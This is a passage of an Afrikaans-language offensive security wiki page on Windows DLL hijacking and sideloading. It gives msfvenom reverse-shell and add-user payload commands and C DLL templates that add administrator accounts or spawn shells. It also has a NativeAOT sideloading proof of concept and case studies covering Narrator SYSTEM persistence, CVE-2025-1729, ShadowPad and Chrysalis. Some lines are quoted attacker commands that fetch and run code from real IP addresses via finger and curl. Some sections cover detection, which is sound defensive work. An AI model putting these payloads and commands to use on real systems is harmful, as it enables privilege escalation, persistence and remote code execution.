Met die tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) of [**Spartacus**](https://github.com/Accenture/Spartacus) kan jy eintlik **’n executable aandui en die library kies** wat jy wil proxify, en ’n **geproxified dll genereer**, of **die DLL aandui** en ’n **geproxified dll genereer**.

### **Meterpreter**

**Kry rev shell (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Kry 'n meterpreter (x86):**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Skep 'n gebruiker (x86; ek het nie 'n x64-weergawe gesien nie):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### Jou eie

In baie gevalle moet die DLL wat jy compile, **elke funksie export wat deur die slagofferproses geïmport word**. As ’n vereiste export ontbreek, kan die binary dit nie resolve nie en misluk die exploit.

<details>
<summary>C DLL template (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>C++ DLL-voorbeeld met gebruikerskepping</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>Alternatiewe C-DLL met thread-inskrywing</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

### NativeAOT DLL met export-triggered initialisering

’n self-contained **.NET NativeAOT shared library** kan as die geplante native DLL gebruik word sonder om ’n eksplisiete `DllMain` te implementeer. Export statiese C#-metodes met `[UnmanagedCallersOnly(EntryPoint = "...")]`; wanneer die native host een van hierdie compiler-generated entry points aanroep, initialiseer NativeAOT die module en loop ’n `[ModuleInitializer]`-metode voordat die exported C#-liggaam loop. Die output vereis nie dat ’n aparte .NET-runtime geïnstalleer is nie.<sup>[[26]](#references)[[27]](#references)[[28]](#references)[[29]](#references)</sup>

Die DLL benodig steeds die **export name en ABI-compatible signatures** wat die gekose host werklik aanroep. Minimale stubs kan genoeg wees om initialisering te trigger, maar ontbrekende exports kan laai verhoed, en ’n verkeerde signature kan die oproep korrupteer. Lys die host se imports op en valideer die resultaat met `dumpbin /exports payload.dll` voordat jy die output hernoem na die dependency name wat die host verwag.<sup>[[26]](#references)[[28]](#references)</sup>

<details>
<summary>Minimale NativeAOT exported DLL</summary>

```csharp
using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

internal static class Bootstrap
{
    [ModuleInitializer]
    internal static void Start()
    {
        File.WriteAllText(Path.Combine(Path.GetTempPath(), "nativeaot-sideload.txt"),
                          Environment.ProcessPath ?? "loaded");
    }
}

public static class Exports
{
    [UnmanagedCallersOnly(EntryPoint = "LoadLibraryShim")]
    public static nint LoadLibraryShim() => 0;
}
```

</details>

Konfigureer die projek as ’n selfstandige Windows-native gedeelde biblioteek:<sup>[[26]](#references)[[27]](#references)</sup>

```xml
<PropertyGroup>
  <TargetFramework>net7.0</TargetFramework>
  <PublishAot>true</PublishAot>
  <NativeLib>Shared</NativeLib>
  <SelfContained>true</SelfContained>
  <RuntimeIdentifier>win-x64</RuntimeIdentifier>
</PropertyGroup>
```

```powershell
dotnet publish .\SideloadPoc.csproj -c Release -r win-x64
dumpbin /exports .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll
Copy-Item .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll .\<expected-name>.dll
```

Plaas die hernoemde DLL langs die gekopieerde, kwesbare uitvoerbare lêer en begin die host via die kodepad wat die versoenbare export aanroep. Hierdie initializer-benadering vermy dat komplekse werk direk in `DllMain` geplaas word, maar die voorvereistes vir sideloading bly onveranderd: die loader moet die dependency volgens naam oplos, die toepassingsgids kies en dit nie eers via KnownDLLs, ’n reeds gelaaide module, SxS-redirecting of beperkte `LOAD_LIBRARY_SEARCH_*`-vlae vind nie.<sup>[[26]](#references)[[30]](#references)</sup>

Vir konvensionele native templates, sien [Windows C payloads](../windows-c-payloads.md). ’n Sideloaded eerste fase kan daarna [process hollowing](../../../reversing/common-api-used-in-malware.md#process-hollowing-aka-runpe) uitvoer, maar dit is ’n afsonderlike injection-tegniek en nie deel van DLL-resolusie nie.

## Opsporing: DLL masquerading library loads

Elastic Defend 9.5.0 verryk ’n library-load-gebeurtenis met `dll.Ext.defense_evasions: "DLL Hijack: Masquerading"` wanneer die gelaaide lêer nie deur Microsoft onderteken is nie en sy lêernaam ooreenstem met ’n naam in Elastic se gekaste inventaris van Windows-/stelsel-DLL’s. Dit verskuif die ontleding van lêernaaminventaris, stelselligging en handtekening na die endpoint-sensor; die kern-EQL kan dus verkort word tot:<sup>[[26]](#references)</sup>

```text
library where host.os.type == "windows" and event.action == "load" and
  dll.Ext.defense_evasions : "DLL Hijack: Masquerading"
```

Beskou die verryking as ’n waardevolle pivot eerder as bewys op sigself. Verhoog die vertroue wanneer ’n getekende host die DLL vanaf sy eie **user-writable** gids laai, die DLL unsigned/untrusted is, en `dll.Ext.relative_file_creation_time` wys dat dit kort voor die laai geskep is. Beperk uitsluitings tot die presiese publisher + host process + installation path; moenie ’n botsende DLL-naam wêreldwyd onderdruk nie, want wettige installers en applications kan private libraries met stelselagtige name insluit.<sup>[[26]](#references)</sup>

Op sensors sonder daardie verryking, benader die gedrag deur ’n botsende DLL-naam met ’n nie-stelsel-laaipad, ’n ontbrekende/ongeldige Microsoft-handtekening en ’n kort lêerskepping-tot-laai-interval te korreleer. Dit vereis ’n bygehoue DLL-naam-inventaris en noukeurig beperkte uitsluitings vir `%SystemRoot%\\System32`, `SysWOW64`, `WinSxS` en ander goedgekeurde ontplooiingspaaie.<sup>[[26]](#references)</sup>

## Gevallestudie: Narrator OneCore TTS Localization DLL Hijack (Toeganklikheid/ATs)

Windows Narrator.exe probeer met opstart steeds ’n voorspelbare, taalspesifieke localization DLL laai, wat vir arbitrêre code execution en persistence gekaap kan word.<sup>[[7]](#references)</sup>

Sleutelfeite
- Probe path (huidige builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (ouer builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- As ’n skryfbare, deur ’n aanvaller beheerde DLL by die OneCore path bestaan, word dit gelaai en `DllMain(DLL_PROCESS_ATTACH)` word uitgevoer. Geen exports word vereis nie.

Ontdekking met Procmon
- Filter: `Process Name is Narrator.exe` en `Operation is Load Image` of `CreateFile`.
- Begin Narrator en let op die poging om die bogenoemde path te laai.

Minimale DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

OPSEC-stilte
- ’n Naïewe hijack sal die UI laat praat/uitlig. Om stil te bly, lys Narrator se threads tydens aanhegting, maak die hooftread oop (`OpenThread(THREAD_SUSPEND_RESUME)`) en skort dit met `SuspendThread` op; gaan voort in jou eie thread. Sien die PoC vir die volledige kode.<sup>[[8]](#references)</sup>

Sneller en volharding via Accessibility-konfigurasie
- Gebruikerskonteks (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Met bogenoemde laai die begin van Narrator die geplante DLL. Druk op die veilige werkskerm (aanmeldskerm) CTRL+WIN+ENTER om Narrator te begin; jou DLL word as SYSTEM op die veilige werkskerm uitgevoer.

RDP-sneller vir SYSTEM-uitvoering (laterale beweging)
- Laat die klassieke RDP-sekuriteitslaag toe: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP na die gasheer en druk CTRL+WIN+ENTER op die aanmeldskerm om Narrator te begin; jou DLL word as SYSTEM op die veilige werkskerm uitgevoer.
- Uitvoering stop wanneer die RDP-sessie sluit—inject/migrate vinnig.

Bring Your Own Accessibility (BYOA)
- Jy kan ’n ingeboude Accessibility Tool (AT)-registerinskrywing kloon (bv. CursorIndicator), dit wysig om na ’n willekeurige binary/DLL te wys, dit invoer en dan `configuration` op daardie AT-naam stel. Dit tree as ’n proxy op vir willekeurige uitvoering binne die Accessibility-raamwerk.

Notas
- Skryfregte onder `%windir%\System32` en die verandering van HKLM-waardes vereis adminregte.
- Alle payload-logika kan in `DLL_PROCESS_ATTACH` wees; geen exports word benodig nie.

## Gevallestudie: CVE-2025-1729 - Privilege Escalation met TPQMAssistant.exe

Hierdie geval demonstreer **Phantom DLL Hijacking** in Lenovo se TrackPoint Quick Menu (`TPQMAssistant.exe`), wat as **CVE-2025-1729** opgespoor word.<sup>[[2]](#references)[[3]](#references)</sup>

### Kwesbaarheidbesonderhede

- **Komponent**: `TPQMAssistant.exe`, geleë by `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Geskeduleerde taak**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` loop daagliks om 9:30 vm. in die konteks van die aangemelde gebruiker.
- **Gidsregte**: Skryfbaar deur `CREATOR OWNER`, wat plaaslike gebruikers toelaat om willekeurige lêers neer te sit.
- **DLL-soekgedrag**: Probeer eers `hostfxr.dll` uit sy werkgids laai en teken "NAME NOT FOUND" aan indien dit ontbreek, wat aandui dat die plaaslike gids voorkeur geniet tydens soektogte.

### Uitbuitingsimplementering

’n Aanvaller kan ’n kwaadwillige `hostfxr.dll`-stub in dieselfde gids plaas en die ontbrekende DLL uitbuit om kode-uitvoering in die gebruiker se konteks te verkry:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Aanvalsvloei

1. As ’n standaardgebruiker, plaas `hostfxr.dll` in `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Wag totdat die geskeduleerde taak om 9:30 vm. in die konteks van die huidige gebruiker loop.
3. As ’n administrateur aangemeld is wanneer die taak uitgevoer word, loop die kwaadwillige DLL in die administrateur se sessie met medium-integriteit.
4. Kombineer standaard UAC-bypass-tegnieke om van medium-integriteit na SYSTEM-regte te verhoog.

## Gevallestudie: MSI CustomAction-dropper + DLL Side-Loading via ondertekende gasheer (wsc_proxy.exe)

Bedreigingsakteurs kombineer dikwels MSI-gebaseerde droppers met DLL Side-Loading om payloads onder ’n vertroude, ondertekende proses uit te voer.<sup>[[10]](#references)</sup>

Oorsig van die ketting
- Die gebruiker laai ’n MSI af. ’n CustomAction loop stilweg tydens die GUI-installasie (bv. LaunchApplication of ’n VBScript-aksie) en stel die volgende fase saam uit ingebedde hulpbronne.
- Die dropper skryf ’n wettige, ondertekende EXE en ’n kwaadwillige DLL na dieselfde gids (voorbeeldpaar: Avast-ondertekende wsc_proxy.exe + aanvaller-beheerde wsc.dll).
- Wanneer die ondertekende EXE begin word, laai Windows se DLL-soekvolgorde eerste wsc.dll uit die werkgids en voer aanvallerkode onder ’n ondertekende ouerproses uit (ATT&CK T1574.001).

MSI-ontleding (waarna om te kyk)
- CustomAction-tabel:
  - Soek na inskrywings wat uitvoerbare lêers of VBScript laat loop. Voorbeeld van ’n verdagte patroon: LaunchApplication wat ’n ingebedde lêer in die agtergrond uitvoer.
  - Inspekteer in Orca (Microsoft Orca.exe) die CustomAction-, InstallExecuteSequence- en Binary-tabelle.
- Ingebedde/verdeelde payloads in die MSI CAB:
  - Administratiewe onttrekking: msiexec /a package.msi /qb TARGETDIR=C:\out
  - Of gebruik lessmsi: lessmsi x package.msi C:\out
  - Soek na veelvuldige klein fragmente wat aaneengeskakel en deur ’n VBScript CustomAction ontsleutel word. Algemene vloei:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Praktiese sideloading met wsc_proxy.exe
- Plaas hierdie twee lêers in dieselfde vouer:
  - wsc_proxy.exe: wettige, ondertekende gasheer (Avast). Die proses probeer om wsc.dll volgens naam uit sy gids te laai.
  - wsc.dll: aanvaller-DLL. As geen spesifieke exports vereis word nie, kan DllMain voldoende wees; bou andersins ’n proxy-DLL en stuur vereiste exports na die egte biblioteek aan terwyl die payload in DllMain uitgevoer word.
- Bou ’n minimale DLL-payload:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Vir uitvoervereistes, gebruik ’n proxying framework (bv. DLLirant/Spartacus) om ’n forwarding DLL te genereer wat ook jou payload uitvoer.

- Hierdie tegniek berus op DLL-naamberesolusie deur die gasheerbinêre lêer. As die gasheer absolute paaie of veilige laaivlae gebruik (bv. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), kan die hijack misluk.
- KnownDLLs, SxS en forwarded exports kan die prioriteit beïnvloed en moet in ag geneem word wanneer die gasheerbinêre lêer en export-set gekies word.

## Getekende triades + geënkripteerde payloads (ShadowPad-gevallestudie)

Check Point het beskryf hoe Ink Dragon ShadowPad ontplooi met ’n **drie-lêer-triade** om by wettige sagteware in te pas terwyl die kernpayload op skyf geënkripteer bly:<sup>[[12]](#references)</sup>

1. **Getekende gasheer-EXE** – verskaffers soos AMD, Realtek of NVIDIA word misbruik (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Die aanvallers hernoem die uitvoerbare lêer sodat dit soos ’n Windows-binêre lêer lyk (byvoorbeeld `conhost.exe`), maar die Authenticode-handtekening bly geldig.
2. **Kwaadwillige loader-DLL** – word langs die EXE geplaas met ’n verwagte naam (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). Die DLL is gewoonlik ’n MFC-binêre lêer wat met die ScatterBrain-framework verduister is; sy enigste taak is om die geënkripteerde blob te vind, dit te dekripteer en ShadowPad reflektief te karteer.
3. **Geënkripteerde payload-blob** – word dikwels as `<name>.tmp` in dieselfde gids gestoor. Nadat die gedekripteerde payload in die geheue gekarteer is, skrap die loader die TMP-lêer om forensiese bewyse uit te wis.

Tradecraft-aantekeninge:

* Deur die getekende EXE te hernoem (terwyl die oorspronklike `OriginalFileName` in die PE-kop behou word), kan dit hom as ’n Windows-binêre lêer voordoen terwyl die verskaffer se handtekening behoue bly. Volg dus Ink Dragon se gewoonte na om `conhost.exe`-agtige binêre lêers te plaas wat in werklikheid AMD/NVIDIA-hulpprogramme is.
* Omdat die uitvoerbare lêer vertrou bly, hoef die meeste allowlisting-kontroles net toe te laat dat jou kwaadwillige DLL langsaan staan. Fokus daarop om die loader-DLL aan te pas; die getekende ouerproses kan gewoonlik onveranderd loop.
* ShadowPad se decryptor verwag dat die TMP-blob langs die loader lê en skryfbaar is, sodat dit die lêer ná kartering kan nulmaak. Hou die gids skryfbaar totdat die payload gelaai is; sodra dit in die geheue is, kan die TMP-lêer veilig vir OPSEC geskrap word.

### LOLBAS-stager + ketting vir sideloading van ’n geargiveerde lêer (finger → tar/curl → WMI)

Operateurs kombineer DLL-sideloading met LOLBAS sodat die enigste pasgemaakte artefak op skyf die kwaadwillige DLL langs die vertroude EXE is:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** Versteekte PowerShell begin `cmd.exe /c`, haal opdragte van ’n Finger-bediener af en stuur dit na `cmd`:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` haal TCP/79-teks op; `| cmd` voer die bedienerrespons uit, sodat operateurs die second stage aan die bedienerkant kan roteer.

- **Ingeboude aflaai/uitpak:** Laai ’n argief met ’n onskadelike uitbreiding af, pak dit uit en plaas die sideload-teiken plus DLL in ’n ewekansige `%LocalAppData%`-lêergids:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` verberg vordering en volg redirects; `tar -xf` gebruik Windows se ingeboude tar.

- **WMI/CIM-bekendstelling:** Begin die EXE via WMI sodat telemetrie ’n deur CIM geskepte proses wys terwyl dit die DLL in dieselfde gids laai:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Werk met binaries wat plaaslike DLLs verkies (bv. `intelbq.exe`, `nearby_share.exe`); die payload (bv. Remcos) loop onder die vertroude naam.

- **Opsporing:** Stel ’n waarskuwing in vir `forfiles` wanneer `/p`, `/m` en `/c` saam voorkom; dit is ongewoon buite admin-skripte.


## Gevallestudie: NSIS-dropper + Bitdefender Submission Wizard-sideload (Chrysalis)

’n Onlangse Lotus Blossom-inbraak het ’n vertroude opdateringsketting misbruik om ’n NSIS-verpakte dropper af te lewer wat ’n DLL-sideload plus payloads wat volledig in geheue loop, voorberei het.<sup>[[13]](#references)</sup>

Tradecraft-vloei
- `update.exe` (NSIS) skep `%AppData%\Bluetooth`, merk dit as **HIDDEN**, plaas ’n hernoemde Bitdefender Submission Wizard `BluetoothService.exe`, ’n kwaadwillige `log.dll` en ’n geënkripteerde blob `BluetoothService`, en begin dan die EXE.
- Die host-EXE voer `log.dll` in en roep `LogInit`/`LogWrite` aan. `LogInit` laai die blob met mmap; `LogWrite` dekripteer dit met ’n pasgemaakte LCG-gebaseerde stroom (konstantes **0x19660D** / **0x3C6EF35F**, sleutelmateriaal afgelei van ’n vorige hash), skryf die plaintext-shellcode oor die buffer, maak tydelike data vry en spring daarnaar.
- Om ’n IAT te vermy, los die loader APIs op deur uitvoernaam-hashes met **FNV-1a basis 0x811C9DC5 + priemgetal 0x1000193** te bereken, en pas dan ’n Murmur-styl avalanche (**0x85EBCA6B**) toe en vergelyk dit met gesoute teikenhashes.

Hoof-shellcode (Chrysalis)
- Dekripteer ’n PE-agtige hoofmodule deur add/XOR/sub met sleutel `gQ2JR&9;` oor vyf passe te herhaal, en laai dan dinamies `Kernel32.dll` → `GetProcAddress` om invoeroplossing te voltooi.
- Bou DLL-naamstringe tydens looptyd weer op met per-karakter bit-rotate/XOR-transformasies, en laai dan `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Gebruik ’n tweede resolver wat deur die **PEB → InMemoryOrderModuleList** loop, elke uitvoertabel in blokke van 4 grepe ontleed met Murmur-styl vermenging, en slegs na `GetProcAddress` terugval as die hash nie gevind word nie.

Ingebedde konfigurasie & C2
- Die konfigurasie is in die geplaasde `BluetoothService`-lêer by **offset 0x30808** (grootte **0x980**) en word met RC4 en die sleutel `qwhvb^435h&*7` gedekripteer, wat die C2-URL en User-Agent onthul.
- Beacons bou ’n kolpuntgeskeide host-profiel, voeg tag `4Q` vooraan, en enkripteer dit dan met RC4 en die sleutel `vAuig34%^325hGV` voordat dit via HTTPS na `HttpSendRequestA` gestuur word. Antwoorde word met RC4 gedekripteer en deur ’n tagskakelaar gestuur (`4T` shell, `4V` prosesuitvoering, `4W/4X` lêerskryf, `4Y` lees/uittrek, `4\\` deïnstalleer, `4` dryf-/lêerenumerasie + gevalle vir stukgewyse oordrag).
- Die uitvoermodus word deur CLI-argumente beheer: geen argumente = installeer persistence (diens/Run-sleutel) wat na `-i` wys; `-i` begin self weer met `-k`; `-k` slaan installasie oor en voer die payload uit.

Alternatiewe loader waargeneem
- Dieselfde inbraak het Tiny C Compiler afgelaai en `svchost.exe -nostdlib -run conf.c` vanaf `C:\ProgramData\USOShared\` uitgevoer, met `libtcc.dll` langsaan. Die C-bronkode wat deur die aanvaller verskaf is, het shellcode ingebed, dit saamgestel en in geheue uitgevoer sonder om ’n PE na die skyf te skryf. Reproduseer met:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- Hierdie TCC-gebaseerde compile-and-run-stadium het `Wininet.dll` tydens looptyd ingevoer en ’n tweede-stadium-shellcode vanaf ’n hardgekodeerde URL afgehaal, wat ’n buigsame loader gelewer het wat hom as ’n compiler-run voordoen.

## Signed-host sideloading with export proxying + host thread parking

Sommige DLL-sideloading-kettings voeg **stabiliteitsingenieurswese** by sodat die wettige host lank genoeg aan die gang bly om latere stadia netjies te laai, eerder as om te crash nadat die kwaadwillige DLL gelaai is.<sup>[[11]](#references)</sup>

Waargenome patroon
- Plaas ’n vertroude EXE langs ’n kwaadwillige DLL met die verwagte afhanklikheidsnaam, soos `version.dll`.
- Die kwaadwillige DLL **proxy elke verwagte export** terug na die werklike stelsel-DLL (byvoorbeeld `%SystemRoot%\\System32\\version.dll`) sodat import-resolusie steeds slaag en die host-proses aanhou werk.
- Ná laai **patch** die kwaadwillige DLL die host se entry point sodat die hooftread in ’n oneindige `Sleep`-lus beland, eerder as om te exit of kodepaaie uit te voer wat die proses sou beëindig.
- ’n Nuwe thread voer die werklike kwaadwillige werk uit: dit dekripteer die volgende-stadium-DLL se naam of pad (RC4/XOR is algemeen), en lanseer dit dan met `LoadLibrary`.

Waarom dit saak maak
- Gewone DLL-proxying behou API-versoenbaarheid, maar waarborg nie dat die host lank genoeg aan die gang bly vir latere stadia nie.
- Om die hooftread in `Sleep(INFINITE)` te parkeer, is ’n eenvoudige manier om die ondertekende proses aktief te hou terwyl die loader dekripsie, staging of netwerkinitialisering in ’n worker-thread uitvoer.
- As jy net na ’n verdagte `DllMain` soek, kan jy hierdie patroon miskyk wanneer die interessante gedrag plaasvind nadat die host se entry point gepatch is en ’n sekondêre thread begin.

Minimale werksvloei
1. Kopieer die ondertekende host-EXE en bepaal watter DLL dit uit die plaaslike gids laai.
2. Bou ’n proxy-DLL wat dieselfde funksies exporteer en dit na die wettige DLL aanstuur.
3. Skep ’n worker-thread vanuit `DllMain(DLL_PROCESS_ATTACH)`.
4. Patch vanuit daardie thread die host se entry point of die hooftread se beginroetine sodat dit in ’n `Sleep`-lus bly.
5. Dekripteer die volgende-stadium-DLL se naam/konfigurasie en roep `LoadLibrary` aan, of map die payload met die hand.

Verdedigingsleidrade
- Ondertekende prosesse wat `version.dll` of soortgelyke algemene libraries uit hul eie toepassingsgids laai in plaas van uit `System32`.
- Geheuepatches by die proses se entry point kort nadat die image gelaai is, veral spronge/aanroepe wat na `Sleep`/`SleepEx` herlei word.
- Threads wat deur ’n proxy-DLL geskep word en onmiddellik `LoadLibrary` aanroep op ’n tweede DLL met ’n gedekripteerde naam.
- Proxy-DLL’s wat alle exports bevat en langs vendor-uitvoerbare lêers in skryfbare staging-gidse geplaas word, soos `ProgramData`, `%TEMP%` of paaie na uitgepakte argiewe.

## References

- [1] [Red Canary – Intelligensie-insigte: Januarie 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - Privilege Escalation deur TPQMAssistant.exe te gebruik](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking in Windows. Eenvoudige C-voorbeeld.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore ontplooi nuwe malware wat Europa teiken](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: Wanneer DLL Hijacks Windows Helpers ontmoet](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Digitale dubbelgangers: Ontleding van ontwikkelende nabootsingsveldtogte wat Gh0st RAT versprei](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Belange wat saamvloei: Ontleding van bedreigingsgroepe wat ’n Suidoos-Asiatiese regering teiken](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Binne Ink Dragon: Onthulling van die relay-netwerk en innerlike werking van ’n geheimsinnige offensiewe operasie](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Die Chrysalis Backdoor: ’n Diepgaande ontleding van Lotus Blossom se toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack-ketting](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Nasporing van Iranian APT Screening Serpens se spioenasieveldtogte van 2026](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – `<appDomainManagerAssembly>`-element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – `<appDomainManagerType>`-element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – `<probing>`-element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – `<bypassTrustedAppStrongNames>`-element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – `<publisherPolicy>`-element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – `<requiredRuntime>`-element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Fast and Furious: Nimbus Manticore se bedrywighede tydens die Iranse konflik](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Taakaksies](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 teiken Suidoos-Asiatiese regerings en kritieke infrastruktuur](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
- [26] [Elastic Security Labs – Heropbou en opsporing van Windows DLL Search-Order Hijacking met Elastic Defend 9.5.0](https://www.elastic.co/security-labs/threat-command/dll-search-order-hijacking-elastic-defend)
- [27] [Microsoft Learn – Bou van native libraries met Native AOT](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/libraries)
- [28] [Microsoft Learn – Native exports met Native AOT](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/interop#native-exports)
- [29] [Microsoft Learn – ModuleInitializerAttribute](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.compilerservices.moduleinitializerattribute?view=net-7.0)
